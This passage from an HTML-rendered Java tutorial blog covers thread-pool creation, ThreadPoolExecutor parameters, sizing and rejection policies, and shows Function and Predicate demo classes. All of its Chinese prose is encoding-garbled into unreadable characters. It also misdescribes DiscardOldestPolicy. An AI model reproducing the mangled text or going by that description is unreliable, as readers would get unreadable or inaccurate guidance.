class="keyword">finally</span> &#123;</span><br><span class="line">            threadPoolExecutor.shutdown();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="çº¿ç¨‹æ± 3å¤§æ–¹æ³•"><a href="#çº¿ç¨‹æ± 3å¤§æ–¹æ³•" class="headerlink" title="çº¿ç¨‹æ± 3å¤§æ–¹æ³•"></a>çº¿ç¨‹æ± 3å¤§æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Executors.newSingleThreadExecutor(); <span class="comment">// å•</span></span><br><span class="line">Executors.newFixedThreadPool(<span class="number">5</span>); <span class="comment">// å›ºå®šå¤§å° </span></span><br><span class="line">Executors.newCachedThreadPool(); <span class="comment">// å¯ä¼¸ç¼©</span></span><br></pre></td></tr></table></figure>

<h3 id="çº¿ç¨‹æ± çš„7ä¸ªå‚æ•°"><a href="#çº¿ç¨‹æ± çš„7ä¸ªå‚æ•°" class="headerlink" title="çº¿ç¨‹æ± çš„7ä¸ªå‚æ•°"></a>çº¿ç¨‹æ± çš„7ä¸ªå‚æ•°</h3><ul>
<li>corePoolSize : æ ¸å¿ƒçº¿ç¨‹æ•°çº¿ç¨‹æ•°å®šä¹‰äº†æœ€å°å¯ä»¥åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°é‡ã€‚</li>
<li>maximumPoolSize : å½“é˜Ÿåˆ—ä¸­å­˜æ”¾çš„ä»»åŠ¡è¾¾åˆ°é˜Ÿåˆ—å®¹é‡çš„æ—¶å€™ï¼Œå½“å‰å¯ä»¥åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°é‡å˜ä¸ºæœ€å¤§çº¿ç¨‹æ•°ã€‚</li>
<li>keepAliveTime:å½“çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ•°é‡å¤§äº corePoolSize çš„æ—¶å€™ï¼Œå¦‚æœè¿™æ—¶æ²¡æœ‰æ–°çš„ä»»åŠ¡æäº¤ï¼Œæ ¸å¿ƒçº¿ç¨‹å¤–çš„çº¿ç¨‹ä¸ä¼šç«‹å³é”€æ¯ï¼Œè€Œæ˜¯ä¼šç­‰å¾…ï¼Œç›´åˆ°ç­‰å¾…çš„æ—¶é—´è¶…è¿‡äº† keepAliveTimeæ‰ä¼šè¢«å›æ”¶é”€æ¯ï¼›</li>
<li>unit : keepAliveTime å‚æ•°çš„æ—¶é—´å•ä½ã€‚</li>
<li>workQueue:  å½“æ–°ä»»åŠ¡æ¥çš„æ—¶å€™ä¼šå…ˆåˆ¤æ–­å½“å‰è¿è¡Œçš„çº¿ç¨‹æ•°é‡æ˜¯å¦è¾¾åˆ°æ ¸å¿ƒçº¿ç¨‹æ•°ï¼Œå¦‚æœè¾¾åˆ°çš„è¯ï¼Œæ–°ä»»åŠ¡å°±ä¼šè¢«å­˜æ”¾åœ¨é˜Ÿåˆ—ä¸­ã€‚</li>
<li>threadFactory :executor åˆ›å»ºæ–°çº¿ç¨‹çš„æ—¶å€™ä¼šç”¨åˆ°ã€‚</li>
<li>handler :é¥±å’Œç­–ç•¥ã€‚å…³äºé¥±å’Œç­–ç•¥ä¸‹é¢å•ç‹¬ä»‹ç»ä¸€ä¸‹ã€‚</li>
</ul>
<h4 id="æœ€å¤§çº¿ç¨‹è¯¥æ€ä¹ˆå®šä¹‰"><a href="#æœ€å¤§çº¿ç¨‹è¯¥æ€ä¹ˆå®šä¹‰" class="headerlink" title="æœ€å¤§çº¿ç¨‹è¯¥æ€ä¹ˆå®šä¹‰?"></a>æœ€å¤§çº¿ç¨‹è¯¥æ€ä¹ˆå®šä¹‰?</h4><p>cpuå¯†é›†å‹, å‡ æ ¸å°±æ˜¯å‡ , å¯ä»¥ä¿æŒcpuçš„æ•ˆç‡æœ€é«˜; å°½é‡ä¸è¦çº¿ç¨‹åˆ‡æ¢;</p>
<p>ioå¯†é›†å‹, 15ä¸ªå¤§å‹ä»»åŠ¡, ioååˆ†å ç”¨èµ„æº, æœ€å¤§çº¿ç¨‹æ•°è¦å¤§äº15å³å¯, ä¸€èˆ¬è®¾ç½®ä¸º30; å› ä¸ºå¦‚æœä¸å¤šè®¾ä¸€ç‚¹, ä¸€ä¸ªçº¿ç¨‹å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨io, cpuæ ¸å°±æµªè´¹äº†,éœ€è¦è¿›è¡Œçº¿ç¨‹åˆ‡æ¢;</p>
<p>è®¡ç®—ï¼ˆCPUï¼‰å¯†é›†å‹æ¶ˆè€—çš„ä¸»è¦æ˜¯ CPU èµ„æºï¼Œå¯ä»¥å°†çº¿ç¨‹æ•°è®¾ç½®ä¸º Nï¼ˆCPU æ ¸å¿ƒæ•°ï¼‰+1ï¼Œæ¯” CPU æ ¸å¿ƒæ•°å¤šå‡ºæ¥çš„ä¸€ä¸ªçº¿ç¨‹æ˜¯ä¸ºäº†é˜²æ­¢çº¿ç¨‹å¶å‘çš„ç¼ºé¡µä¸­æ–­ï¼Œæˆ–è€…å…¶å®ƒåŸå› å¯¼è‡´çš„ä»»åŠ¡æš‚åœè€Œå¸¦æ¥çš„å½±å“ã€‚ä¸€æ—¦ä»»åŠ¡æš‚åœï¼ŒCPU å°±ä¼šå¤„äºç©ºé—²çŠ¶æ€ï¼Œè€Œåœ¨è¿™ç§æƒ…å†µä¸‹å¤šå‡ºæ¥çš„ä¸€ä¸ªçº¿ç¨‹å°±å¯ä»¥å……åˆ†åˆ©ç”¨ CPU çš„ç©ºé—²æ—¶é—´ã€‚</p>
<p>ioå¯†é›†å‹ç³»ç»Ÿä¼šç”¨å¤§éƒ¨åˆ†çš„æ—¶é—´æ¥å¤„ç† I&#x2F;O äº¤äº’ï¼Œè€Œçº¿ç¨‹åœ¨å¤„ç† I&#x2F;O çš„æ—¶é—´æ®µå†…ä¸ä¼šå ç”¨ CPU æ¥å¤„ç†ï¼Œè¿™æ—¶å°±å¯ä»¥å°† CPU äº¤å‡ºç»™å…¶å®ƒçº¿ç¨‹ä½¿ç”¨ã€‚å› æ­¤åœ¨ I&#x2F;O å¯†é›†å‹ä»»åŠ¡çš„åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¤šé…ç½®ä¸€äº›çº¿ç¨‹ï¼Œå…·ä½“çš„è®¡ç®—æ–¹æ³•æ˜¯ 2Nã€‚</p>
<h3 id="çº¿ç¨‹æ± çš„å››å¤§é¥±å’Œç­–ç•¥"><a href="#çº¿ç¨‹æ± çš„å››å¤§é¥±å’Œç­–ç•¥" class="headerlink" title="çº¿ç¨‹æ± çš„å››å¤§é¥±å’Œç­–ç•¥"></a>çº¿ç¨‹æ± çš„å››å¤§é¥±å’Œç­–ç•¥</h3><ul>
<li>ThreadPoolExecutor.AbortPolicy(é»˜è®¤)ï¼šæŠ›å‡º RejectedExecutionExceptionæ¥æ‹’ç»æ–°ä»»åŠ¡çš„å¤„ç†ã€‚</li>
<li>ThreadPoolExecutor.CallerRunsPolicyï¼šè°ƒç”¨æ‰§è¡Œè‡ªå·±çš„çº¿ç¨‹è¿è¡Œä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥åœ¨è°ƒç”¨executeæ–¹æ³•çš„çº¿ç¨‹ä¸­è¿è¡Œ(run)è¢«æ‹’ç»çš„ä»»åŠ¡ï¼Œå¦‚æœæ‰§è¡Œç¨‹åºå·²å…³é—­ï¼Œåˆ™ä¼šä¸¢å¼ƒè¯¥ä»»åŠ¡ã€‚å› æ­¤è¿™ç§ç­–ç•¥ä¼šé™ä½å¯¹äºæ–°ä»»åŠ¡æäº¤é€Ÿåº¦ï¼Œå½±å“ç¨‹åºçš„æ•´ä½“æ€§èƒ½ã€‚å¦‚æœæ‚¨çš„åº”ç”¨ç¨‹åºå¯ä»¥æ‰¿å—æ­¤å»¶è¿Ÿå¹¶ä¸”ä½ è¦æ±‚ä»»ä½•ä¸€ä¸ªä»»åŠ¡è¯·æ±‚éƒ½è¦è¢«æ‰§è¡Œçš„è¯ï¼Œä½ å¯ä»¥é€‰æ‹©è¿™ä¸ªç­–ç•¥ã€‚</li>
<li>ThreadPoolExecutor.DiscardPolicyï¼š ä¸å¤„ç†æ–°ä»»åŠ¡ï¼Œç›´æ¥ä¸¢å¼ƒæ‰, ä¸æŠ›å‡ºå¼‚å¸¸;</li>
<li>ThreadPoolExecutor.DiscardOldestPolicyï¼š å¦‚æœçº¿ç¨‹æ± æ²¡æœ‰å…³é—­, å–å‡ºçº¿ç¨‹æ± é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªçº¿ç¨‹, å°è¯•è®©è¯¥çº¿ç¨‹å»å¤„ç†ä»»åŠ¡, ä½†æ˜¯å¦‚æœè¯¥çº¿ç¨‹åœ¨å¿™, åˆ™ä¼šç›´æ¥æ‹’ç»,ä¹Ÿä¸æŠ›å‡ºå¼‚å¸¸;</li>
</ul>
<p>ä¸¾ä¸ªä¾‹å­ï¼š Spring é€šè¿‡ ThreadPoolTaskExecutor æˆ–è€…æˆ‘ä»¬ç›´æ¥é€šè¿‡ ThreadPoolExecutor çš„æ„é€ å‡½æ•°åˆ›å»ºçº¿ç¨‹æ± çš„æ—¶å€™ï¼Œå½“æˆ‘ä»¬ä¸æŒ‡å®š RejectedExecutionHandler é¥±å’Œç­–ç•¥çš„è¯æ¥é…ç½®çº¿ç¨‹æ± çš„æ—¶å€™é»˜è®¤ä½¿ç”¨çš„æ˜¯ ThreadPoolExecutor.AbortPolicyã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒThreadPoolExecutor å°†æŠ›å‡º RejectedExecutionException æ¥æ‹’ç»æ–°æ¥çš„ä»»åŠ¡ ï¼Œè¿™ä»£è¡¨ä½ å°†ä¸¢å¤±å¯¹è¿™ä¸ªä»»åŠ¡çš„å¤„ç†ã€‚ å¯¹äºå¯ä¼¸ç¼©çš„åº”ç”¨ç¨‹åºï¼Œå»ºè®®ä½¿ç”¨ ThreadPoolExecutor.CallerRunsPolicyã€‚å½“æœ€å¤§æ± è¢«å¡«æ»¡æ—¶ï¼Œæ­¤ç­–ç•¥ä¸ºæˆ‘ä»¬æä¾›å¯ä¼¸ç¼©é˜Ÿåˆ—ã€‚ï¼ˆè¿™ä¸ªç›´æ¥æŸ¥çœ‹ ThreadPoolExecutor çš„æ„é€ å‡½æ•°æºç å°±å¯ä»¥çœ‹å‡ºï¼Œæ¯”è¾ƒç®€å•çš„åŸå› ï¼Œè¿™é‡Œå°±ä¸è´´ä»£ç äº†ï¼‰</p>
<h3 id="çº¿ç¨‹æ± åŸç†åˆ†æ"><a href="#çº¿ç¨‹æ± åŸç†åˆ†æ" class="headerlink" title="çº¿ç¨‹æ± åŸç†åˆ†æ"></a>çº¿ç¨‹æ± åŸç†åˆ†æ</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848062.png" alt="å›¾è§£çº¿ç¨‹æ± å®ç°åŸç†"></p>
<h3 id="çº¿ç¨‹æ± ä¼˜åŒ–"><a href="#çº¿ç¨‹æ± ä¼˜åŒ–" class="headerlink" title="çº¿ç¨‹æ± ä¼˜åŒ–"></a>çº¿ç¨‹æ± ä¼˜åŒ–</h3><ul>
<li>å¦‚æœæƒ³è¦<strong>é™ä½ç³»ç»Ÿèµ„æºçš„æ¶ˆè€—</strong>ï¼ˆcpuä½¿ç”¨ç‡ï¼Œæ“ä½œç³»ç»Ÿèµ„æºæ¶ˆè€—ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥è®¾ç½®ä¸€ä¸ªæ¯”è¾ƒå¤§çš„é˜Ÿåˆ—å®¹é‡å’Œä¸€ä¸ªæ¯”è¾ƒå°çš„çº¿ç¨‹æ± å®¹é‡</li>
<li>å¦‚æœ<strong>é˜Ÿåˆ—ç»å¸¸å †ç§¯æ¯”è¾ƒå¤šçš„ä»»åŠ¡</strong>ï¼Œå¹¶ä¸”ä¸šåŠ¡æ–¹é¢éœ€è¦åŠ å¿«å¤„ç†é€Ÿåº¦æ—¶ï¼Œå¯ä»¥é€‚å½“åŠ å¤§maximumPoolSizeï¼Œæ‰¾ä¸€äº›æ± å¤–çº¿ç¨‹ï¼ˆä¸´æ—¶å·¥ï¼‰å¸®å¿™</li>
<li>timeræ˜¯å•çº¿ç¨‹çš„ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œæ—¶é—´å¾ˆé•¿ï¼Œä¼šå½±å“ä¸‹ä¸€ä¸ªæ‰§è¡Œçº¿ç¨‹ï¼Œå®é™…é¡¹ç›®ä¸­å°½å¯èƒ½ç”¨ScheduledThreadPoolExecutorï¼Œæ…ç”¨Timer</li>
<li>ScheduledThreadPoolExecutorç»§æ‰¿äº†ThreadPoolExecutorï¼Œä¸€èˆ¬è¢«ç”¨æ¥å½“åšå»¶è¿Ÿé˜Ÿåˆ—çº¿ç¨‹æ± ä½¿ç”¨ï¼Œä½†æ˜¯ä»”ç»†æŸ¥çœ‹ä»–çš„æ„é€ å‡½æ•°å¯ä»¥å‘ç°ï¼Œ<strong>æœ€å¤§çº¿ç¨‹æ•°maximumPoolSizeéƒ½è¢«è®¾ç½®æˆé»˜è®¤çš„Integer.MAX_VALUE</strong>ï¼Œç”Ÿäº§ç¯å¢ƒä¸Šå®¹æ˜“é€ æˆOOMæˆ–è€…å¯¼è‡´æœåŠ¡å™¨æ€§èƒ½ä¸‹é™ï¼Œå»ºè®®ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„å»¶è¿Ÿé˜Ÿåˆ—ä»£æ›¿</li>
</ul>
<h3 id="çº¿ç¨‹æ± å‚æ•°åŠ¨æ€åŒ–"><a href="#çº¿ç¨‹æ± å‚æ•°åŠ¨æ€åŒ–" class="headerlink" title="çº¿ç¨‹æ± å‚æ•°åŠ¨æ€åŒ–"></a>çº¿ç¨‹æ± å‚æ•°åŠ¨æ€åŒ–</h3><p>ä¸šåŠ¡ä¸æµé‡ä¸ä¼šæ€»æ˜¯ä¸€æˆä¸å˜çš„ï¼Œå½“åˆåˆç†çš„é…ç½®å¯èƒ½ä¹Ÿä¼šåœ¨çªå‘çš„å·¨å¤§æµé‡é¢å‰å…µè´¥å¦‚å±±å€’ï¼Œå›ºå®šçš„çº¿ç¨‹æ± é…ç½®äº¦æ˜¯å¦‚æ­¤ï¼Œæ»¡è¶³å½“æ—¶ï¼Œå´å¯èƒ½é¡¶ä¸ä½æœªæ¥ã€‚ä¸ºæ­¤ï¼Œç¾å›¢å›¢é˜Ÿåœ¨åšå®¢ä¸­æåˆ°äº†<strong>çº¿ç¨‹æ± å‚æ•°åŠ¨æ€åŒ–</strong>çš„æ€è·¯ï¼Œéå¸¸å€¼å¾—ç²¾è¯»ï¼</p>
<p><a href="http://xuyk.top/go.html?u=aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYmFZdVg4YUN3UTlQUDZrN1REbDJXdw==">Javaçº¿ç¨‹æ± å®ç°åŸç†åŠå…¶åœ¨ç¾å›¢ä¸šåŠ¡ä¸­çš„å®è·µ</a></p>
<p><code>ctl</code>è¿™ä¸ªAtomicIntegerç±»å‹ï¼Œæ˜¯å¯¹çº¿ç¨‹æ± çš„è¿è¡ŒçŠ¶æ€å’Œçº¿ç¨‹æ± ä¸­æœ‰æ•ˆçº¿ç¨‹çš„æ•°é‡è¿›è¡Œæ§åˆ¶çš„ä¸€ä¸ªå­—æ®µï¼Œ å®ƒåŒæ—¶åŒ…å«ä¸¤éƒ¨åˆ†çš„ä¿¡æ¯ï¼šçº¿ç¨‹æ± çš„è¿è¡ŒçŠ¶æ€ (runState) å’Œçº¿ç¨‹æ± å†…æœ‰æ•ˆçº¿ç¨‹çš„æ•°é‡ (workerCount)ï¼Œé«˜3ä½ä¿å­˜runStateï¼Œä½29ä½ä¿å­˜workerCountï¼Œä¸¤ä¸ªå˜é‡ä¹‹é—´äº’ä¸å¹²æ‰°ã€‚ç”¨ä¸€ä¸ªå˜é‡å»å­˜å‚¨ä¸¤ä¸ªå€¼ï¼Œå¯é¿å…åœ¨åšç›¸å…³å†³ç­–æ—¶ï¼Œå‡ºç°ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä¸å¿…ä¸ºäº†ç»´æŠ¤ä¸¤è€…çš„ä¸€è‡´ï¼Œè€Œå ç”¨é”èµ„æºã€‚é€šè¿‡é˜…è¯»çº¿ç¨‹æ± æºä»£ç ä¹Ÿå¯ä»¥å‘ç°ï¼Œç»å¸¸å‡ºç°è¦åŒæ—¶åˆ¤æ–­çº¿ç¨‹æ± è¿è¡ŒçŠ¶æ€å’Œçº¿ç¨‹æ•°é‡çš„æƒ…å†µã€‚çº¿ç¨‹æ± ä¹Ÿæä¾›äº†è‹¥å¹²æ–¹æ³•å»ä¾›ç”¨æˆ·è·å¾—çº¿ç¨‹æ± å½“å‰çš„è¿è¡ŒçŠ¶æ€ã€çº¿ç¨‹ä¸ªæ•°ã€‚è¿™é‡Œéƒ½ä½¿ç”¨çš„æ˜¯ä½è¿ç®—çš„æ–¹å¼ï¼Œç›¸æ¯”äºåŸºæœ¬è¿ç®—ï¼Œé€Ÿåº¦ä¹Ÿä¼šå¿«å¾ˆå¤šã€‚</p>
<p>ThreadPoolExecutorçš„è¿è¡ŒçŠ¶æ€å’Œç”Ÿå‘½å‘¨æœŸï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211904470.jpg" alt="å›¾ç‰‡"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211856318.png" alt="image-20211221185614876"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211855709.png" alt="image-20211221185558185"></p>
<h3 id="å½“çº¿ç¨‹æ± é‡Œçš„çº¿ç¨‹æ‰§è¡Œå¼‚å¸¸ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ"><a href="#å½“çº¿ç¨‹æ± é‡Œçš„çº¿ç¨‹æ‰§è¡Œå¼‚å¸¸ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ" class="headerlink" title="å½“çº¿ç¨‹æ± é‡Œçš„çº¿ç¨‹æ‰§è¡Œå¼‚å¸¸ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ"></a>å½“çº¿ç¨‹æ± é‡Œçš„çº¿ç¨‹æ‰§è¡Œå¼‚å¸¸ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</h3><p>ä¸€ä¸ªçº¿ç¨‹å‡ºç°å¼‚å¸¸ä¸ä¼šå½±å“çº¿ç¨‹æ± é‡Œé¢å…¶ä»–çº¿ç¨‹çš„æ­£å¸¸æ‰§è¡Œï¼Œè¯¥å¼‚å¸¸çº¿ç¨‹ä¸æ˜¯è¢«å›æ”¶è€Œæ˜¯çº¿ç¨‹æ± æŠŠè¿™ä¸ªçº¿ç¨‹ç§»é™¤æ‰ï¼ŒåŒæ—¶åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹æ”¾åˆ°çº¿ç¨‹æ± ä¸­ã€‚</p>
<p><strong>å¼‚å¸¸çº¿ç¨‹æ˜¯å¦ä¼šæ‰“å°å¼‚å¸¸ä¿¡æ¯</strong></p>
<ol>
<li>è°ƒç”¨æ–¹æ³•ä¸º <strong>execute()</strong> ï¼Œä¼šæ‰“å°å‡ºå †æ ˆå¼‚å¸¸æ—¥å¿—</li>
<li>è°ƒç”¨æ–¹æ³•ä¸º <strong>submit()</strong> ï¼Œå †æ ˆå¼‚å¸¸æ²¡æœ‰è¾“å‡ºã€‚ä½†æ˜¯å¦‚æœä¸šåŠ¡éœ€è¦è·å–çº¿ç¨‹è¿”å›å€¼ï¼Œè°ƒç”¨äº†<strong>Future.get()æ–¹æ³•</strong>æ—¶ï¼Œå¯ä»¥æ•è·æ‰“å°å‡ºå †æ ˆå¼‚å¸¸ä¿¡æ¯ã€‚è€Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¯èƒ½å¹¶ä¸éœ€è¦è·å–æ‰§è¡Œç»“æœï¼Œå¯¼è‡´å¼‚å¸¸â€œè¢«åƒâ€ï¼Œè¿›è€Œä¸è§¦å‘å‘Šè­¦ä¿¡æ¯é…¿æˆå¤§ç¥¸ï¼Œ<strong>æ‰€ä»¥ä¸ªäººä¸å»ºè®®ä½¿ç”¨</strong><code>submit()</code>ã€‚</li>
</ol>
<blockquote>
<p>ä¸¤è€…åœ¨ä½¿ç”¨æ—¥å¿—å·¥å…·æ‰“å°è‡ªå®šä¹‰æ—¥å¿—éƒ½æ¯”è¾ƒå›°éš¾ï¼Œæ‰€ä»¥ä¸ªäººæ›´æ¨èç»“åˆ<strong>jdk8çš„æ–°ç‰¹æ€§CompletableFuture</strong>ï¼Œæ­é…çº¿ç¨‹æ± ä¸€èµ·ä½¿ç”¨ï¼Œè¯¦æƒ…å¯ä»¥æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="http://xuyk.top/go.html?u=aHR0cDovL3h1eWsudG9wL3Bvc3RzL2FzeW5jLmh0bWw=">å¦‚ä½•ä¼˜é›…åœ°å¼‚æ­¥ç¼–ç¨‹</a></p>
</blockquote>
<h3 id="å¦‚æœçº¿ä¸Šçªç„¶å®•æœºï¼Œé˜»å¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡æ€ä¹ˆåŠï¼Ÿ"><a href="#å¦‚æœçº¿ä¸Šçªç„¶å®•æœºï¼Œé˜»å¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="å¦‚æœçº¿ä¸Šçªç„¶å®•æœºï¼Œé˜»å¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡æ€ä¹ˆåŠï¼Ÿ"></a>å¦‚æœçº¿ä¸Šçªç„¶å®•æœºï¼Œé˜»å¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡æ€ä¹ˆåŠï¼Ÿ</h3><p><strong>é˜»å¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰ä»»åŠ¡ä¼šä¸¢å¤±</strong></p>
<p><strong>ä¿è¯ä»»åŠ¡ä¸ä¸¢å¤±çš„æ€è·¯</strong></p>
<ol>
<li>æˆ‘ä»¬å¯ä»¥åœ¨æäº¤ä»»åŠ¡å‰å…ˆè¿›è¡Œè½åº“å¤„ç†ï¼Œå½“å®•æœºé‡å¯åï¼Œå†æ‹¿å‡ºå¾…å¤„ç†çš„ä»»åŠ¡ç»§ç»­æ‰§è¡Œã€‚</li>
<li>ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—</li>
</ol>
<h3 id="å¦‚æœçº¿ç¨‹æ± çš„é˜Ÿåˆ—æ»¡äº†ä¹‹åä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Ÿ"><a href="#å¦‚æœçº¿ç¨‹æ± çš„é˜Ÿåˆ—æ»¡äº†ä¹‹åä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Ÿ" class="headerlink" title="å¦‚æœçº¿ç¨‹æ± çš„é˜Ÿåˆ—æ»¡äº†ä¹‹åä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Ÿ"></a>å¦‚æœçº¿ç¨‹æ± çš„é˜Ÿåˆ—æ»¡äº†ä¹‹åä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Ÿ</h3><p>å…³é”®åœ¨äº <strong>çº¿ç¨‹æ± å½“å‰æ´»è·ƒçº¿ç¨‹æ•°</strong> ä¸ <strong>æœ€å¤§çº¿ç¨‹æ•°</strong> çš„å¯¹æ¯”</p>
<ol>
<li>çº¿ç¨‹æ± å½“å‰æ´»è·ƒçº¿ç¨‹æ•° &lt; æœ€å¤§çº¿ç¨‹æ•°ï¼Œåˆ™çº¿ç¨‹æ± ä¼šæŠ½è°ƒ æ± å¤–çº¿ç¨‹ï¼ˆç³»ç»Ÿçº¿ç¨‹ï¼‰æ¥å¤„ç†ä»»åŠ¡</li>
<li>çº¿ç¨‹æ± å½“å‰æ´»è·ƒçº¿ç¨‹æ•° &gt;&#x3D; æœ€å¤§çº¿ç¨‹æ•°ï¼Œä¼šæ ¹æ®çº¿ç¨‹æ± çš„æ‹’ç»ç­–ç•¥æ¥å¤„ç†ä»»åŠ¡</li>
</ol>
<p><strong>ä¿è¯ä»»åŠ¡100%è¢«å¤„ç†çš„æ€è·¯</strong>ï¼š è‡ªå®šä¹‰æ‹’ç»ç­–ç•¥ï¼ŒæŠŠä»»åŠ¡äº¤ç»™å…¶ä»–è´Ÿè½½ä½çš„çº¿ç¨‹æ± è¿›è¡Œå¤„ç†ï¼Œæˆ–è€…æ”¾å…¥æ¶ˆæ¯é˜Ÿåˆ—äº¤ç»™å…¶ä»–çº¿ç¨‹æ± å¤„ç† &#x2F; é˜»å¡é˜Ÿåˆ—å¤„ç†å®Œæ¯•åå¤„ç†æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡</p>
<h2 id="å››å¤§å‡½æ•°å¼æ¥å£"><a href="#å››å¤§å‡½æ•°å¼æ¥å£" class="headerlink" title="å››å¤§å‡½æ•°å¼æ¥å£"></a>å››å¤§å‡½æ•°å¼æ¥å£</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‡½æ•°å¼æ¥å£ï¼šæœ‰ä¸€ä¸ªè¾“å…¥å‚æ•°ï¼Œæœ‰ä¸€ä¸ªè¾“å‡º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:04 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Function&lt;String, String&gt; function = new Function&lt;String, String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public String apply(String s) &#123;</span></span><br><span class="line"><span class="comment">//                System.out.println(s);</span></span><br><span class="line"><span class="comment">//                return s;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        function.apply(&quot;100&quot;);</span></span><br><span class="line">        <span class="type">Function</span> <span class="variable">function</span> <span class="operator">=</span> (str) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(function.apply(<span class="string">&quot;asd&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Predicate;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ–­å®šå‹æ¥å£ï¼š æœ‰ä¸€ä¸ªè¾“å…¥å‚æ•°ï¼Œ è¿”å›å€¼ä¸ºboolean</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:25 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Predicate&lt;String&gt; predicate = new Predicate&lt;String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public boolean test(String s) &#123;</span></span><br><span class="line"><span class="comment">//                return !&quot;&quot;.equals(s);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        String s = &quot;&quot;;</span></span><br><span class="line"><span class="comment">//        System.out.println(predicate.test(s));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Predicate&lt;String&gt; predicate = (s)-&gt; !&quot;&quot;.equals(s);</span></span><br><span class="line"><span class="comment">//        String s = &quot;&quot;;</span></span><br><span class="line"><span class="comment">//        System.out.println(predicate.test(s));</span></span><br><span class="line"></span><br><span class="line">        Predicate&lt;String&gt; predicate = String::isEmpty;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line">        System.out.println(predicate.test(s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



